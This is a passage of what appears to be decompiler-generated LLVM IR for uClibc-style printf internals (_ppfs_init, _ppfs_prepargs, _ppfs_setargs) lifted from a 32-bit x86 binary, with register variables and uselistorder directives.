  uselistorder i32 %v3_8050aea, { 1, 0 }
  uselistorder i32 %v2_8050ac2, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8050ac6, { 0, 1, 3, 2 }
  uselistorder i32 %v0_8050ab0, { 1, 0, 2 }
  uselistorder i32* %stack_var_-348, { 1, 0, 2 }
  uselistorder i32* %stack_var_-364, { 2, 3, 6, 5, 4, 0, 8, 7, 1, 9, 10, 11 }
  uselistorder i32* %edx.global-to-local, { 2, 3, 0, 4, 12, 1, 13, 17, 14, 15, 16, 18, 19, 20, 21, 23, 22, 25, 24, 26, 27, 28, 29, 30, 5, 7, 6, 8, 9, 10, 11 }
  uselistorder i32* %ecx.global-to-local, { 3, 0, 4, 5, 6, 1, 2 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 12, 10, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 53, 54, 55, 56, 57, 23, 24, 25, 26, 27, 28, 29, 30, 31, 52, 32, 33, 34, 35 }
  uselistorder i32 348, { 1, 0 }
  uselistorder i32 356, { 1, 0 }
  uselistorder i32 ()* @_charpad, { 2, 1, 0, 3 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 332, { 1, 0, 2, 3 }
  uselistorder i32 204, { 2, 0, 3, 1, 4 }
  uselistorder i32 344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 368, { 3, 1, 4, 0, 2 }
  uselistorder label %dec_label_pc_8050fd2, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8050fcb, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_8050f93, { 1, 0 }
  uselistorder label %dec_label_pc_8050f58, { 1, 0 }
  uselistorder label %dec_label_pc_8050f49, { 1, 0 }
  uselistorder label %dec_label_pc_8050f32, { 1, 0 }
  uselistorder label %dec_label_pc_8050edd, { 1, 0 }
  uselistorder label %dec_label_pc_8050eaf, { 1, 0 }
  uselistorder label %dec_label_pc_8050e94, { 1, 0 }
  uselistorder label %dec_label_pc_8050e7e, { 1, 0 }
  uselistorder label %dec_label_pc_8050e6a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050e5e, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8050df7, { 1, 0 }
  uselistorder label %dec_label_pc_8050dea, { 1, 0 }
  uselistorder label %dec_label_pc_8050d75, { 1, 0 }
  uselistorder label %dec_label_pc_8050d09, { 1, 0 }
  uselistorder label %dec_label_pc_8050cbe, { 1, 0 }
  uselistorder label %dec_label_pc_8050caf, { 5, 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_8050c8a, { 1, 0 }
  uselistorder label %dec_label_pc_8050c75, { 1, 0 }
  uselistorder label %dec_label_pc_8050c5c, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_8050c0d, { 1, 0 }
  uselistorder label %dec_label_pc_8050bf4, { 1, 0 }
  uselistorder label %dec_label_pc_8050be0, { 1, 0 }
  uselistorder label %dec_label_pc_8050bdb, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050bbc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050b49, { 1, 0 }
  uselistorder label %dec_label_pc_8050b41, { 1, 0 }
  uselistorder label %dec_label_pc_8050aed, { 1, 0 }
  uselistorder label %dec_label_pc_8050ae2, { 1, 0 }
  uselistorder label %dec_label_pc_8050ab8.backedge, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8050fe0 = load i32, i32* @esi, align 4
  %v0_8050fe1 = load i32, i32* @ebx, align 4
  store i32 %v0_8050fe1, i32* %stack_var_-8, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  %v3_8050ff5 = bitcast i32* %arg1 to i8*
  %v4_8050ff5 = call i32 @__GI_memset(i8* %v3_8050ff5, i32 0, i32 188)
  store i32 %v4_8050ff5, i32* %eax.global-to-local, align 4
  %v0_8050ffa = load i32, i32* @ebx, align 4
  %v1_8050ffa = add i32 %v0_8050ffa, 24
  %v2_8050ffa = inttoptr i32 %v1_8050ffa to i32*
  %v3_8050ffa = load i32, i32* %v2_8050ffa, align 4
  %v4_8050ffa = add i32 %v3_8050ffa, -1
  store i32 %v4_8050ffa, i32* %v2_8050ffa, align 4
  %v0_8050ffd = load i32, i32* @esi, align 4
  %v1_8050ffd = load i32, i32* @ebx, align 4
  %v2_8050ffd = inttoptr i32 %v1_8050ffd to i32*
  store i32 %v0_8050ffd, i32* %v2_8050ffd, align 4
  %v0_8050fff = load i32, i32* @ebx, align 4
  %v1_8050fff = add i32 %v0_8050fff, 40
  store i32 %v1_8050fff, i32* %eax.global-to-local, align 4
  store i32 9, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805100a

dec_label_pc_805100a:                             ; preds = %dec_label_pc_805100a, %entry
  %v0_805100a = phi i32 [ %v1_8051010, %dec_label_pc_805100a ], [ %v1_8050fff, %entry ]
  %v1_805100a = inttoptr i32 %v0_805100a to i32*
  store i32 8, i32* %v1_805100a, align 4
  %v0_8051010 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051010 = add i32 %v0_8051010, 4
  store i32 %v1_8051010, i32* %eax.global-to-local, align 4
  %v0_8051013 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051013 = add i32 %v0_8051013, -1
  %v8_8051013 = icmp eq i32 %v1_8051013, 0
  store i32 %v1_8051013, i32* %edx.global-to-local, align 4
  %v1_8051014 = icmp eq i1 %v8_8051013, false
  br i1 %v1_8051014, label %dec_label_pc_805100a, label %dec_label_pc_8051016

dec_label_pc_8051016:                             ; preds = %dec_label_pc_805100a
  %v0_8051016 = load i32, i32* @esi, align 4
  store i32 %v0_8051016, i32* %eax.global-to-local, align 4
  %v1_805104120 = inttoptr i32 %v0_8051016 to i8*
  %v2_805104121 = load i8, i8* %v1_805104120, align 1
  %v3_805104122 = zext i8 %v2_805104121 to i32
  %v5_805104123 = and i32 %v1_8051013, -256
  %v6_805104124 = or i32 %v3_805104122, %v5_805104123
  store i32 %v6_805104124, i32* %edx.global-to-local, align 4
  %v4_805104325 = icmp eq i8 %v2_805104121, 0
  %v1_805104526 = icmp eq i1 %v4_805104325, false
  br i1 %v1_805104526, label %dec_label_pc_805101f, label %dec_label_pc_8051047

dec_label_pc_805101f:                             ; preds = %dec_label_pc_8051016, %dec_label_pc_8051041.backedge
  %v6_805104129 = phi i32 [ %v6_8051041, %dec_label_pc_8051041.backedge ], [ %v6_805104124, %dec_label_pc_8051016 ]
  %v2_805104128 = phi i8 [ %v2_8051041, %dec_label_pc_8051041.backedge ], [ %v2_805104121, %dec_label_pc_8051016 ]
  %v0_805102427 = phi i32 [ %v0_8051024.be, %dec_label_pc_8051041.backedge ], [ %v0_8051016, %dec_label_pc_8051016 ]
  %v10_805101f = icmp eq i8 %v2_805104128, 37
  %v1_8051022 = icmp eq i1 %v10_805101f, false
  br i1 %v1_8051022, label %dec_label_pc_8051040, label %dec_label_pc_8051024

dec_label_pc_8051024:                             ; preds = %dec_label_pc_805101f
  %v1_8051024 = add i32 %v0_805102427, 1
  store i32 %v1_8051024, i32* %eax.global-to-local, align 4
  %v1_8051025 = inttoptr i32 %v1_8051024 to i8*
  %v2_8051025 = load i8, i8* %v1_8051025, align 1
  %v11_8051025 = icmp eq i8 %v2_8051025, 37
  br i1 %v11_8051025, label %dec_label_pc_8051040, label %dec_label_pc_805102a

dec_label_pc_805102a:                             ; preds = %dec_label_pc_8051024
  %v1_805102d = load i32, i32* @ebx, align 4
  %v2_805102d = inttoptr i32 %v1_805102d to i32*
  store i32 %v1_8051024, i32* %v2_805102d, align 4
  %v0_805102f = load i32, i32* @ebx, align 4
  %v1_8051030 = inttoptr i32 %v0_805102f to i32*
  %v2_8051030 = call i32 @_ppfs_parsespec(i32* %v1_8051030)
  store i32 %v2_8051030, i32* %eax.global-to-local, align 4
  %v2_8051038 = icmp slt i32 %v2_8051030, 0
  br i1 %v2_8051038, label %dec_label_pc_805104b, label %dec_label_pc_805103c

dec_label_pc_805103c:                             ; preds = %dec_label_pc_805102a
  %v0_805103c = load i32, i32* @ebx, align 4
  %v1_805103c = inttoptr i32 %v0_805103c to i32*
  %v2_805103c = load i32, i32* %v1_805103c, align 4
  %v4_8051041.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8051041.backedge

dec_label_pc_8051040:                             ; preds = %dec_label_pc_8051024, %dec_label_pc_805101f
  %v0_8051040 = phi i32 [ %v1_8051024, %dec_label_pc_8051024 ], [ %v0_805102427, %dec_label_pc_805101f ]
  %v1_8051040 = add i32 %v0_8051040, 1
  br label %dec_label_pc_8051041.backedge

dec_label_pc_8051041.backedge:                    ; preds = %dec_label_pc_8051040, %dec_label_pc_805103c
  %v4_8051041.be = phi i32 [ %v4_8051041.pre.pre, %dec_label_pc_805103c ], [ %v6_805104129, %dec_label_pc_8051040 ]
  %v0_8051024.be = phi i32 [ %v2_805103c, %dec_label_pc_805103c ], [ %v1_8051040, %dec_label_pc_8051040 ]
  store i32 %v0_8051024.be, i32* %eax.global-to-local, align 4
  %v1_8051041 = inttoptr i32 %v0_8051024.be to i8*
  %v2_8051041 = load i8, i8* %v1_8051041, align 1
  %v3_8051041 = zext i8 %v2_8051041 to i32
  %v5_8051041 = and i32 %v4_8051041.be, -256
  %v6_8051041 = or i32 %v3_8051041, %v5_8051041
  store i32 %v6_8051041, i32* %edx.global-to-local, align 4
  %v4_8051043 = icmp eq i8 %v2_8051041, 0
  %v1_8051045 = icmp eq i1 %v4_8051043, false
  br i1 %v1_8051045, label %dec_label_pc_805101f, label %dec_label_pc_8051041.dec_label_pc_8051047_crit_edge

dec_label_pc_8051041.dec_label_pc_8051047_crit_edge: ; preds = %dec_label_pc_8051041.backedge
  %v0_8051047.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051047

dec_label_pc_8051047:                             ; preds = %dec_label_pc_8051041.dec_label_pc_8051047_crit_edge, %dec_label_pc_8051016
  %v0_8051047 = phi i32 [ %v0_8051047.pre, %dec_label_pc_8051041.dec_label_pc_8051047_crit_edge ], [ %v0_8051016, %dec_label_pc_8051016 ]
  %v1_8051047 = load i32, i32* @ebx, align 4
  %v2_8051047 = inttoptr i32 %v1_8051047 to i32*
  store i32 %v0_8051047, i32* %v2_8051047, align 4
  br label %dec_label_pc_805104b

dec_label_pc_805104b:                             ; preds = %dec_label_pc_805102a, %dec_label_pc_8051047
  %storemerge = phi i32 [ 0, %dec_label_pc_8051047 ], [ -1, %dec_label_pc_805102a ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_805104b = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805104b, i32* @edx, align 4
  %v2_805104c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805104c, i32* @ebx, align 4
  store i32 %v0_8050fe0, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v6_8051041, { 1, 0 }
  uselistorder i8 %v2_8051041, { 1, 2, 0 }
  uselistorder i32 %v0_8051024.be, { 2, 1, 0 }
  uselistorder i32 %v0_805102427, { 1, 0 }
  uselistorder i32 %v0_8051016, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8051013, { 0, 2, 1 }
  uselistorder i32 %v1_8051010, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 2, 1, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_805104b, { 1, 0 }
  uselistorder label %dec_label_pc_805101f, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_8051050 = load i32, i32* @esi, align 4
  %v0_8051051 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805105d = add i32 %arg1, 24
  %v2_805105d = inttoptr i32 %v1_805105d to i32*
  %v3_805105d = load i32, i32* %v2_805105d, align 4
  %v2_8051060 = add i32 %arg1, 76
  %v3_8051060 = inttoptr i32 %v2_8051060 to i32*
  store i32 %arg2, i32* %v3_8051060, align 4
  %tmp8 = icmp slt i32 %v3_805105d, 1
  br i1 %tmp8, label %dec_label_pc_805108e, label %dec_label_pc_8051067

dec_label_pc_8051067:                             ; preds = %entry
  %v1_805106a = load i32, i32* @ebx, align 4
  %v2_805106a = add i32 %v1_805106a, 28
  %v3_805106a = inttoptr i32 %v2_805106a to i32*
  store i32 %v3_805105d, i32* %v3_805106a, align 4
  %v0_805106d = load i32, i32* @ebx, align 4
  %v1_805106d = add i32 %v0_805106d, 24
  %v2_805106d = inttoptr i32 %v1_805106d to i32*
  store i32 0, i32* %v2_805106d, align 4
  %v0_8051074 = load i32, i32* @ebx, align 4
  %v1_8051074 = add i32 %v0_8051074, 4
  %v2_8051074 = inttoptr i32 %v1_8051074 to i32*
  store i32 0, i32* %v2_8051074, align 4
  %v0_805107b = load i32, i32* @ebx, align 4
  %v1_805107b = add i32 %v0_805107b, 8
  %v2_805107b = inttoptr i32 %v1_805107b to i32*
  store i32 0, i32* %v2_805107b, align 4
  %v0_8051082 = load i32, i32* @ebx, align 4
  %v1_8051083 = call i32 @_ppfs_setargs(i32 %v0_8051082)
  %v1_8051088 = load i32, i32* @ebx, align 4
  %v2_8051088 = add i32 %v1_8051088, 24
  %v3_8051088 = inttoptr i32 %v2_8051088 to i32*
  store i32 %v3_805105d, i32* %v3_8051088, align 4
  br label %dec_label_pc_805108e

dec_label_pc_805108e:                             ; preds = %entry, %dec_label_pc_8051067
  %v2_805108e = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_8051051, i32* @ebx, align 4
  store i32 %v0_8051050, i32* @esi, align 4
  ret i32 %v2_805108e

; uselistorder directives
  uselistorder i32 %v3_805105d, { 1, 2, 0 }
  uselistorder i32 (i32)* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805108e, { 1, 0 }
}

define i32 @_ppfs_setargs(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051095 = load i32, i32* @ebx, align 4
  store i32 %v0_8051095, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_805109a = add i32 %arg1, 80
  store i32 %v1_805109a, i32* %ebx.global-to-local, align 4
  %v1_805109d = add i32 %arg1, 24
  %v2_805109d = inttoptr i32 %v1_805109d to i32*
  %v3_805109d = load i32, i32* %v2_805109d, align 4
  %v4_805109d = icmp eq i32 %v3_805109d, 0
  %v1_80510a1 = icmp eq i1 %v4_805109d, false
  %v1_8051157 = add i32 %arg1, 8
  %v2_8051157 = inttoptr i32 %v1_8051157 to i32*
  %v3_8051157 = load i32, i32* %v2_8051157, align 4
  %v8_8051157 = icmp eq i32 %v3_8051157, -2147483648
  %v1_805115e = icmp eq i1 %v8_8051157, false
  br i1 %v1_80510a1, label %dec_label_pc_8051157, label %dec_label_pc_80510a7

dec_label_pc_80510a7:                             ; preds = %entry
  br i1 %v1_805115e, label %dec_label_pc_80510c1, label %dec_label_pc_80510b0

dec_label_pc_80510b0:                             ; preds = %dec_label_pc_80510a7
  %v1_80510b0 = add i32 %arg1, 76
  %v2_80510b0 = inttoptr i32 %v1_80510b0 to i32*
  %v3_80510b0 = load i32, i32* %v2_80510b0, align 4
  store i32 %v3_80510b0, i32* %eax.global-to-local, align 4
  %v1_80510b3 = add i32 %v3_80510b0, 4
  store i32 %v1_80510b3, i32* %edx.global-to-local, align 4
  store i32 %v1_80510b3, i32* %v2_80510b0, align 4
  %v0_80510b9 = load i32, i32* %eax.global-to-local, align 4
  %v1_80510b9 = inttoptr i32 %v0_80510b9 to i32*
  %v2_80510b9 = load i32, i32* %v1_80510b9, align 4
  store i32 %v2_80510b9, i32* %eax.global-to-local, align 4
  %v1_80510bb = load i32, i32* @ecx, align 4
  %v2_80510bb = add i32 %v1_80510bb, 80
  %v3_80510bb = inttoptr i32 %v2_80510bb to i32*
  store i32 %v2_80510b9, i32* %v3_80510bb, align 4
  %v0_80510be = load i32, i32* %eax.global-to-local, align 4
  %v1_80510be = load i32, i32* @ecx, align 4
  %v2_80510be = add i32 %v1_80510be, 8
  %v3_80510be = inttoptr i32 %v2_80510be to i32*
  store i32 %v0_80510be, i32* %v3_80510be, align 4
  %v0_80510c1.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80510c1

dec_label_pc_80510c1:                             ; preds = %dec_label_pc_80510a7, %dec_label_pc_80510b0
  %v1_80510d0 = phi i32 [ %arg1, %dec_label_pc_80510a7 ], [ %v0_80510c1.pre, %dec_label_pc_80510b0 ]
  %v1_80510c1 = add i32 %v1_80510d0, 4
  %v2_80510c1 = inttoptr i32 %v1_80510c1 to i32*
  %v3_80510c1 = load i32, i32* %v2_80510c1, align 4
  %v8_80510c1 = icmp eq i32 %v3_80510c1, -2147483648
  %v1_80510c8 = icmp eq i1 %v8_80510c1, false
  br i1 %v1_80510c8, label %dec_label_pc_80510db, label %dec_label_pc_80510ca

dec_label_pc_80510ca:                             ; preds = %dec_label_pc_80510c1
  %v1_80510ca = add i32 %v1_80510d0, 76
  %v2_80510ca = inttoptr i32 %v1_80510ca to i32*
  %v3_80510ca = load i32, i32* %v2_80510ca, align 4
  store i32 %v3_80510ca, i32* %eax.global-to-local, align 4
  %v1_80510cd = add i32 %v3_80510ca, 4
  store i32 %v1_80510cd, i32* %edx.global-to-local, align 4
  store i32 %v1_80510cd, i32* %v2_80510ca, align 4
  %v0_80510d3 = load i32, i32* %eax.global-to-local, align 4
  %v1_80510d3 = inttoptr i32 %v0_80510d3 to i32*
  %v2_80510d3 = load i32, i32* %v1_80510d3, align 4
  store i32 %v2_80510d3, i32* %eax.global-to-local, align 4
  %v1_80510d5 = load i32, i32* @ecx, align 4
  %v2_80510d5 = add i32 %v1_80510d5, 80
  %v3_80510d5 = inttoptr i32 %v2_80510d5 to i32*
  store i32 %v2_80510d3, i32* %v3_80510d5, align 4
  %v0_80510d8 = load i32, i32* %eax.global-to-local, align 4
  %v1_80510d8 = load i32, i32* @ecx, align 4
  %v2_80510d8 = add i32 %v1_80510d8, 4
  %v3_80510d8 = inttoptr i32 %v2_80510d8 to i32*
  store i32 %v0_80510d8, i32* %v3_80510d8, align 4
  %v1_805115017.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80510db

dec_label_pc_80510db:                             ; preds = %dec_label_pc_80510c1, %dec_label_pc_80510ca
  %v1_805115017 = phi i32 [ %v1_80510d0, %dec_label_pc_80510c1 ], [ %v1_805115017.pre, %dec_label_pc_80510ca ]
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_805115018 = add i32 %v1_805115017, 28
  %v3_805115019 = inttoptr i32 %v2_805115018 to i32*
  %v4_805115020 = load i32, i32* %v3_805115019, align 4
  %v5_805115322 = icmp sgt i32 %v4_805115020, 0
  br i1 %v5_805115322, label %dec_label_pc_80510df, label %dec_label_pc_8051185.loopexit

dec_label_pc_80510df:                             ; preds = %dec_label_pc_80510db, %dec_label_pc_805114f
  %v1_805115024 = phi i32 [ %v1_8051150, %dec_label_pc_805114f ], [ %v1_805115017, %dec_label_pc_80510db ]
  %v1_80510df23 = phi i32 [ %v1_805114f, %dec_label_pc_805114f ], [ 0, %dec_label_pc_80510db ]
  %v2_80510df = mul i32 %v1_80510df23, 4
  %v3_80510df = add i32 %v2_80510df, 40
  %v4_80510df = add i32 %v3_80510df, %v1_805115024
  %v5_80510df = inttoptr i32 %v4_80510df to i32*
  %v6_80510df = load i32, i32* %v5_80510df, align 4
  store i32 %v6_80510df, i32* %eax.global-to-local, align 4
  %v1_80510e3 = add i32 %v6_80510df, -8
  %v9_80510e3 = icmp eq i32 %v1_80510e3, 0
  br i1 %v9_80510e3, label %dec_label_pc_805114f, label %dec_label_pc_80510e8

dec_label_pc_80510e8:                             ; preds = %dec_label_pc_80510df
  %v10_80510e3 = icmp slt i32 %v1_80510e3, 0
  %v6_80510e3 = sub i32 7, %v6_80510df
  %v7_80510e3 = and i32 %v6_80510e3, %v6_80510df
  %v8_80510e3 = icmp slt i32 %v7_80510e3, 0
  %v1_80510e8 = add i32 %v1_805115024, 76
  %v2_80510e8 = inttoptr i32 %v1_80510e8 to i32*
  %v3_80510e8 = load i32, i32* %v2_80510e8, align 4
  store i32 %v3_80510e8, i32* %edx.global-to-local, align 4
  %v3_80510eb = icmp eq i1 %v10_80510e3, %v8_80510e3
  br i1 %v3_80510eb, label %dec_label_pc_80510fb, label %dec_label_pc_80510ed

dec_label_pc_80510ed:                             ; preds = %dec_label_pc_80510e8
  %tmp15 = icmp slt i32 %v6_80510df, 3
  %v9_80510f4 = icmp eq i32 %v6_80510df, 7
  %v1_80510f7 = icmp eq i1 %v9_80510f4, false
  %or.cond = or i1 %tmp15, %v1_80510f7
  br i1 %or.cond, label %dec_label_pc_8051142, label %dec_label_pc_8051124

dec_label_pc_80510fb:                             ; preds = %dec_label_pc_80510e8
  %tmp16 = icmp sgt i32 %v6_80510df, 1024
  br i1 %tmp16, label %dec_label_pc_8051104, label %dec_label_pc_8051142

dec_label_pc_8051104:                             ; preds = %dec_label_pc_80510fb
  %v6_8051104 = icmp eq i32 %v6_80510df, 2048
  br i1 %v6_8051104, label %dec_label_pc_8051114, label %dec_label_pc_805110b

dec_label_pc_805110b:                             ; preds = %dec_label_pc_8051104
  %v9_805110b = icmp eq i32 %v6_80510df, 2055
  %v1_8051110 = icmp eq i1 %v9_805110b, false
  br i1 %v1_8051110, label %dec_label_pc_8051142, label %dec_label_pc_8051133

dec_label_pc_8051114:                             ; preds = %dec_label_pc_8051104
  %v1_8051114 = add i32 %v3_80510e8, 8
  store i32 %v1_8051114, i32* %eax.global-to-local, align 4
  store i32 %v1_8051114, i32* %v2_80510e8, align 4
  %v0_805111a = load i32, i32* %edx.global-to-local, align 4
  %v1_805111a = inttoptr i32 %v0_805111a to i32*
  %v2_805111a = load i32, i32* %v1_805111a, align 4
  store i32 %v2_805111a, i32* %eax.global-to-local, align 4
  %v1_805111c = add i32 %v0_805111a, 4
  %v2_805111c = inttoptr i32 %v1_805111c to i32*
  %v3_805111c = load i32, i32* %v2_805111c, align 4
  store i32 %v3_805111c, i32* %edx.global-to-local, align 4
  %v1_805111f = load i32, i32* %ebx.global-to-local, align 4
  %v2_805111f = add i32 %v1_805111f, 4
  %v3_805111f = inttoptr i32 %v2_805111f to i32*
  store i32 %v3_805111c, i32* %v3_805111f, align 4
  %v0_805114a.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805114a

dec_label_pc_8051124:                             ; preds = %dec_label_pc_80510ed
  %v3_8051124 = load i32, i32* %v2_80510e8, align 4
  store i32 %v3_8051124, i32* %edx.global-to-local, align 4
  %v1_8051127 = add i32 %v3_8051124, 8
  store i32 %v1_8051127, i32* %eax.global-to-local, align 4
  store i32 %v1_8051127, i32* %v2_80510e8, align 4
  %v0_805112d = load i32, i32* %edx.global-to-local, align 4
  %v1_805112d = inttoptr i32 %v0_805112d to double*
  %v2_805112d = load double, double* %v1_805112d, align 4
  %v2_805112f = load i32, i32* %ebx.global-to-local, align 4
  %v4_805112f = inttoptr i32 %v2_805112f to double*
  store double %v2_805112d, double* %v4_805112f, align 4
  br label %dec_label_pc_805114c

dec_label_pc_8051133:                             ; preds = %dec_label_pc_805110b
  %v3_8051133 = load i32, i32* %v2_80510e8, align 4
  store i32 %v3_8051133, i32* %edx.global-to-local, align 4
  %v1_8051136 = add i32 %v3_8051133, 12
  store i32 %v1_8051136, i32* %eax.global-to-local, align 4
  store i32 %v1_8051136, i32* %v2_80510e8, align 4
  %v0_805113c = load i32, i32* %edx.global-to-local, align 4
  %v1_805113c = inttoptr i32 %v0_805113c to x86_fp80*
  %v2_805113c = load x86_fp80, x86_fp80* %v1_805113c, align 4
  %v2_805113e = load i32, i32* %ebx.global-to-local, align 4
  %v3_805113e = inttoptr i32 %v2_805113e to x86_fp80*
  store x86_fp80 %v2_805113c, x86_fp80* %v3_805113e, align 4
  br label %dec_label_pc_805114c

dec_label_pc_8051142:                             ; preds = %dec_label_pc_80510ed, %dec_label_pc_80510fb, %dec_label_pc_805110b
  %v1_8051142 = add i32 %v3_80510e8, 4
  store i32 %v1_8051142, i32* %eax.global-to-local, align 4
  store i32 %v1_8051142, i32* %v2_80510e8, align 4
  %v0_8051148 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051148 = inttoptr i32 %v0_8051148 to i32*
  %v2_8051148 = load i32, i32* %v1_8051148, align 4
  store i32 %v2_8051148, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805114a

dec_label_pc_805114a:                             ; preds = %dec_label_pc_8051114, %dec_label_pc_8051142
  %v0_805114a = phi i32 [ %v0_805114a.pre, %dec_label_pc_8051114 ], [ %v2_8051148, %dec_label_pc_8051142 ]
  %v1_805114a = load i32, i32* %ebx.global-to-local, align 4
  %v2_805114a = inttoptr i32 %v1_805114a to i32*
  store i32 %v0_805114a, i32* %v2_805114a, align 4
  %v0_805114c.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805114c

dec_label_pc_805114c:                             ; preds = %dec_label_pc_8051133, %dec_label_pc_8051124, %dec_label_pc_805114a
  %v0_805114c = phi i32 [ %v2_805113e, %dec_label_pc_8051133 ], [ %v2_805112f, %dec_label_pc_8051124 ], [ %v0_805114c.pre, %dec_label_pc_805114a ]
  %v1_805114c = add i32 %v0_805114c, 12
  store i32 %v1_805114c, i32* %ebx.global-to-local, align 4
  %v0_805114f.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_8051150.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805114f

dec_label_pc_805114f:                             ; preds = %dec_label_pc_80510df, %dec_label_pc_805114c
  %v1_8051150 = phi i32 [ %v1_805115024, %dec_label_pc_80510df ], [ %v1_8051150.pre, %dec_label_pc_805114c ]
  %v0_805114f = phi i32 [ %v1_80510df23, %dec_label_pc_80510df ], [ %v0_805114f.pre, %dec_label_pc_805114c ]
  %v1_805114f = add i32 %v0_805114f, 1
  store i32 %v1_805114f, i32* %esi.global-to-local, align 4
  %v2_8051150 = add i32 %v1_8051150, 28
  %v3_8051150 = inttoptr i32 %v2_8051150 to i32*
  %v4_8051150 = load i32, i32* %v3_8051150, align 4
  %v5_8051153 = icmp slt i32 %v1_805114f, %v4_8051150
  br i1 %v5_8051153, label %dec_label_pc_80510df, label %dec_label_pc_8051150.dec_label_pc_8051185.loopexit_crit_edge

dec_label_pc_8051157:                             ; preds = %entry
  br i1 %v1_805115e, label %dec_label_pc_805116e, label %dec_label_pc_8051160

dec_label_pc_8051160:                             ; preds = %dec_label_pc_8051157
  %v1_8051160 = add i32 %arg1, 36
  %v2_8051160 = inttoptr i32 %v1_8051160 to i8*
  %v3_8051160 = load i8, i8* %v2_8051160, align 1
  %v2_8051164 = zext i8 %v3_8051160 to i32
  %v3_8051164 = mul nuw nsw i32 %v2_8051164, 12
  store i32 %v3_8051164, i32* %eax.global-to-local, align 4
  %v2_8051167 = add i32 %arg1, 68
  %v3_8051167 = add i32 %v2_8051167, %v3_8051164
  %v4_8051167 = inttoptr i32 %v3_8051167 to i32*
  %v5_8051167 = load i32, i32* %v4_8051167, align 4
  store i32 %v5_8051167, i32* %eax.global-to-local, align 4
  store i32 %v5_8051167, i32* %v2_8051157, align 4
  %v0_805116e.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805116e

dec_label_pc_805116e:                             ; preds = %dec_label_pc_8051157, %dec_label_pc_8051160
  %v1_8051182 = phi i32 [ %arg1, %dec_label_pc_8051157 ], [ %v0_805116e.pre, %dec_label_pc_8051160 ]
  %v1_805116e = add i32 %v1_8051182, 4
  %v2_805116e = inttoptr i32 %v1_805116e to i32*
  %v3_805116e = load i32, i32* %v2_805116e, align 4
  %v8_805116e = icmp eq i32 %v3_805116e, -2147483648
  %v1_8051175 = icmp eq i1 %v8_805116e, false
  br i1 %v1_8051175, label %dec_label_pc_8051185, label %dec_label_pc_8051177

dec_label_pc_8051177:                             ; preds = %dec_label_pc_805116e
  %v1_8051177 = add i32 %v1_8051182, 37
  %v2_8051177 = inttoptr i32 %v1_8051177 to i8*
  %v3_8051177 = load i8, i8* %v2_8051177, align 1
  %v2_805117b = zext i8 %v3_8051177 to i32
  %v3_805117b = mul nuw nsw i32 %v2_805117b, 12
  store i32 %v3_805117b, i32* %eax.global-to-local, align 4
  %v1_805117e = load i32, i32* %ebx.global-to-local, align 4
  %v2_805117e = add nsw i32 %v3_805117b, -12
  %v3_805117e = add i32 %v2_805117e, %v1_805117e
  %v4_805117e = inttoptr i32 %v3_805117e to i32*
  %v5_805117e = load i32, i32* %v4_805117e, align 4
  store i32 %v5_805117e, i32* %eax.global-to-local, align 4
  store i32 %v5_805117e, i32* %v2_805116e, align 4
  %v0_8051185.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8051185

